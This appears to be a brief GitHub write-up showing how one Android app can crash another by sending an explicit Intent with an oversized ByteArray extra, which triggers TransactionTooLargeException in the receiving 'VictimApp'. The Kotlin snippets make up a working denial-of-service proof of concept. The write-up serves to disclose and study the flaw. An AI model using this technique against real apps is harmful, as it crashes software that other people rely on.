# Intent TransactionTooLargeException attack

There is a way to crash any running app by sending `Intent` with extras of specific size.

Let's try to crash our **VictimApp**:
1. To communicate with it, we should use `Intent` with a specified package name of the **VictimApp** `MainActivity`:
```kotlin
val intent = Intent().apply {
    setClassName(
        "com.example.victimapp",
        "com.example.victimapp.MainActivity"
    )  
}
context.startActivity(intent)
```
2. Let's put some big object as an `Intent` extra:
We can use a `ByteArray(800 * 800)` for it
```kotlin
val intent = Intent().apply {
    setClassName(
        "com.example.victimapp",
        "com.example.victimapp.MainActivity"
    )
    putExtra("test", Bundle().apply {
        putByteArray("data", ByteArray(800 * 800))
    })
}
context.startActivity(intent)
```
3. When we send this `Intent`, we expect to see the `TransactionTooLargeException` on the sender (AttackerApp) app side, but for some reason, we don't. `TransactionTooLargeException` happens on the receiver (VictimApp) side and crashes it.
   

[intentAttack.webm](https://github.com/user-attachments/assets/af43d48e-e43f-471c-a6b6-c74e7a18917d)

4. When we do the same thing with a bigger `ByteArray(8000 * 8000)`, it crashes the sender app only (as we expect).
